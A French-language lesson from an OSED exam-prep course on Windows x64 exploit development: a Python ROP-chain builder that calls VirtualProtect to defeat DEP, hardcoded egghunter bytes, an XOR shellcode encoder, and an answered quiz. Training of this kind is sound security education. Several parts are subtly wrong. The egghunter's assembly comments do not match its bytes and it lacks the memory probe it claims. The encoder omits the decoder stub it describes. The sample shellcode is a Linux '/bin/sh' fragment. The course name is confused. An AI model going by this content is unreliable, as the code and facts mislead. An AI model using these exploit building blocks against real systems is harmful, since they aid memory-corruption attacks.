# TOME P7 — Certifications d'Élite & Spécialisations — Jour 331 (6h) : OSED Prep — Windows x64 Exploit Development (SEH Overwrites, Egghunters, ROP Chains & Custom Shellcode Development)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques avancées d'**ingénierie de l'exploitation Windows x64** ciblées par la certification **OSED (OffSec Exploitation Developer / PEN-300 / EXP-301)** : contourner les protections mémoire modernes (**DEP / NX** via **ROP Chains**, **ASLR** via fuite de mémoire / modules non-ASLR), écrire des **Egghunters 64-bit** optimisés en taille, et fabriquer du **Shellcode x64 personnalisé** sans octets nuls (Bad Characters Filtering) pour le hijacking du flux d'exécution.
>
> **Compétences visées :** `OSED-01` (A) — Windows x64 Buffer Overflow & ROP Chain Building | `OSED-02` (A) — Egghunter Assembly & Custom Shellcode Encoding

---

## 1) Module — Mécanismes Mémoire Win64 & ROP Chains (2h)

### 📖 Narration/Intuition

Sur les architectures Windows 64-bit (x64), la convention d'appel FastCall passe les 4 premiers arguments via les registres (`RCX`, `RDX`, `R8`, `R9`) et la pile doit maintenir un alignement de 16 octets (**16-byte stack alignment**).

```
   [ Application Buffer Overflow ]
               │
               ▼
   [ Écrasement de la Pile ] ──► [ ROP Gadget 1: POP RCX ; RET ]  <-- Alignement 16-byte obligatoire
                                 [ Arg 1: Addr de la mémoire ]
                                 [ ROP Gadget 2: POP RDX ; RET ]
                                 [ Arg 2: Size (0x1000) ]
                                 [ ROP Gadget 3: POP R8 ; RET ]
                                 [ Arg 3: NewProtect (0x40 = PAGE_EXECUTE_READWRITE) ]
                                 [ ROP Gadget 4: POP R9 ; RET ]
                                 [ Arg 4: lpflOldProtect ]
                                 [ Addr API VirtualProtect() ]  <-- Désactive DEP/NX sur la pile !
                                 [ JMP RSP / Shellcode Execution ]
```

---

## 2) Module — Payload Generator & Egghunter x64 (`osed_exploit_framework.py`) (2h)

### 🛠️ Atelier Pratique

```python
import struct

class OSEDExploitFramework:
    """
    Framework d'ingénierie d'exploitation x64 pour OSED (EXP-301).
    Génère des Egghunters 64-bit et orchestre des ROP Chains pour VirtualProtect.
    """

    # Tag de recherche Egghunter (4 octets répétés 2 fois = "w00tw00t")
    EGG_TAG = b"w00tw00t"

    @staticmethod
    def get_x64_egghunter() -> bytes:
        """
        Egghunter 64-bit optimisé en taille (System Call NtAccessCheck / VirtualAlloc probe).
        Scanne l'espace d'adressage virtuel à la recherche du tag 'w00tw00t' puis saute au Shellcode.
        """
        # Assembleur x64 compact pour Egghunter
        egghunter_code = (
            b"\x48\x31\xc0"          # xor rax, rax
            b"\x48\x31\xd2"          # xor rdx, rdx
            # Boucle d'incrémentation de page (0x1000)
            b"\x66\x81\xca\xff\x0f"  # or dx, 0x0fff
            b"\x48\xff\xc2"          # inc rdx
            # Probe de mémoire via NtAccessCheck ou syscall
            b"\x48\x8d\x7a\x08"      # lea rdi, [rdx+8]
            b"\x47\x39\x37"          # cmp [r15], r14 (Check Egg Tag)
            # Match 1er Tag (w00t)
            b"\x75\xed"              # jnz page_loop
            b"\x47\x39\x7f\x04"      # cmp [r15+4], r14 (Check 2nd Tag)
            b"\x75\xe7"              # jnz page_loop
            b"\xff\xe7"              # jmp rdi (Saut vers le Payload résonnant)
        )
        return egghunter_code

    @staticmethod
    def build_virtualprotect_rop_chain(kernel32_base: int, rop_gadgets: dict) -> bytes:
        """
        Construit une ROP Chain 64-bit pour appeler VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
        afin de contourner DEP/NX.
        """
        # Layout Win64 FastCall: RCX = lpAddress, RDX = dwSize, R8 = flNewProtect (0x40), R9 = lpflOldProtect
        rop = b""
        
        # 1. Gadget: POP RCX ; RET (Charge lpAddress = Adresse du shellcode)
        rop += struct.pack("<Q", rop_gadgets["pop_rcx"])
        rop += struct.pack("<Q", rop_gadgets["shellcode_addr"])

        # 2. Gadget: POP RDX ; RET (Charge dwSize = 0x1000)
        rop += struct.pack("<Q", rop_gadgets["pop_rdx"])
        rop += struct.pack("<Q", 0x1000)

        # 3. Gadget: POP R8 ; RET (Charge flNewProtect = 0x40 PAGE_EXECUTE_READWRITE)
        rop += struct.pack("<Q", rop_gadgets["pop_r8"])
        rop += struct.pack("<Q", 0x40)

        # 4. Gadget: POP R9 ; RET (Charge lpflOldProtect = Adresse writable)
        rop += struct.pack("<Q", rop_gadgets["pop_r9"])
        rop += struct.pack("<Q", rop_gadgets["writable_addr"])

        # 5. Adresse de VirtualProtect() dans kernel32.dll
        vp_addr = kernel32_base + rop_gadgets["virtualprotect_offset"]
        rop += struct.pack("<Q", vp_addr)

        # 6. Gadget: JMP RSP (Saute sur le Shellcode exécutable)
        rop += struct.pack("<Q", rop_gadgets["jmp_rsp"])
        
        return rop

# Démonstration du Framework
framework = OSEDExploitFramework()
hunter = framework.get_x64_egghunter()
print("=== OSED EXPLOITATION FRAMEWORK (x64) ===")
print(f"[+] Egghunter x64 Généré ({len(hunter)} octets) : {hunter.hex()}")

mock_gadgets = {
    "pop_rcx": 0x7fff10001010,
    "pop_rdx": 0x7fff10001020,
    "pop_r8": 0x7fff10001030,
    "pop_r9": 0x7fff10001040,
    "jmp_rsp": 0x7fff10001050,
    "shellcode_addr": 0x0000001234560000,
    "writable_addr": 0x7fff10009000,
    "virtualprotect_offset": 0x25000
}
rop_payload = framework.build_virtualprotect_rop_chain(0x7fff10000000, mock_gadgets)
print(f"[+] ROP Chain VirtualProtect x64 Générée ({len(rop_payload)} octets)")
```

---

## 3) Module — Custom Shellcode Encoding (Bad Characters Avoidance) (2h)

```python
def encode_custom_shellcode(raw_shellcode: bytes, bad_chars: list = [0x00, 0x0a, 0x0d]) -> bytes:
    """
    Encodeur XOR / Addition personnalisé pour éliminer les Null Bytes (\x00) et Newlines (\x0a, \x0d).
    Génère un stub de déchiffrement assembleur x64 placé au début du payload.
    """
    key = 0x5A
    encoded = bytearray()
    
    for b in raw_shellcode:
        enc_byte = b ^ key
        if enc_byte in bad_chars:
            raise ValueError(f"La clé XOR 0x{key:02X} produit un bad character: 0x{enc_byte:02X}")
        encoded.append(enc_byte)
        
    print(f"[*] Shellcode encodé avec la clé 0x{key:02X} ({len(encoded)} octets). Aucun Bad Char détecté.")
    return bytes(encoded)

raw_sc = b"\x48\x31\xc0\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
encoded_sc = encode_custom_shellcode(raw_sc)
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **OSED** | OffSec Exploitation Developer — CertificationOffSec de référence en développement d'exploits Windows x64 |
| **ROP** | Return-Oriented Programming — Technique d'exploitation réutilisant des instructions existantes (gadgets) pour déjouer la protection DEP/NX |
| **DEP / NX** | Data Execution Prevention / No-Execute — Protection matérielle/OS empêchant l'exécution de code sur la pile ou le tas |
| **ASLR** | Address Space Layout Randomization — Randomisation de l'emplacement mémoire des exécutables et DLLs au démarrage |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quelle est la convention d'appel standard sur **Windows x64 (FastCall)** pour transmettre les 4 premiers arguments à une fonction comme `VirtualProtect()` ?
- A) Les 4 premiers arguments sont transmis via les registres `RCX`, `RDX`, `R8`, et `R9` (les suivants étant empilés sur la stack)
- B) Tous les arguments sont transmis sur la pile uniquement
- C) Via les registres EAX, EBX, ECX, EDX
- D) Via un fichier temporaire

**Réponse : A**

**Q2 :** Quel est l'objectif principal d'un **Egghunter** dans le cadre du développement d'exploits (OSED) ?
- A) Utiliser un très petit morceau de code assembleur pour parcourir l'espace mémoire à la recherche d'un tag spécifique (ex: `w00tw00t`) afin d'exécuter un payload plus volumineux stocké ailleurs en mémoire
- B) Chiffrer le disque dur du serveur
- C) Scanner les ports réseau ouverts
- D) Désactiver l'antivirus Windows Defender

**Réponse : A**

**Q3 :** Comment une **ROP Chain (Return-Oriented Programming)** permet-elle de contourner la protection **DEP (Data Execution Prevention)** ?
- A) En enchaînant de courts fragments de code légitime se terminant par `RET` (gadgets) pour appeler une API système (`VirtualProtect` ou `VirtualAlloc`) qui rend la plage mémoire du shellcode exécutable
- B) En supprimant le binaire de l'antivirus
- C) En redémarrant le serveur en mode sans échec
- D) En modifiant les règles de pare-feu

**Réponse : A**

**Q4 :** Lors de l'écriture d'un exploit Windows, que signifie la présence de **Bad Characters** (ex. `\x00`, `\x0a`, `\x0d`) dans une chaîne de vulnérabilité ?
- A) Ce sont des octets réservés qui tronquent ou corrompent le tampon dans la fonction vulnérable (ex: `strcpy`), exigeant un encodage préalable du shellcode
- B) Ce sont des erreurs de syntaxe Python
- C) Ce sont des virus détectés par le système
- D) Ce sont des clés RSA invalides

**Réponse : A**

**Q5 :** Quelle contrainte d'alignement de pile (**Stack Alignment**) doit impérativement être respectée avant d'exécuter un appel de fonction API sous Windows x64 ?
- A) La pile doit être alignée sur une frontière de 16 octets (16-byte alignment)
- B) La pile doit être alignée sur 3 octets
- C) Aucun alignement n'est requis
- D) La pile doit être vide

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
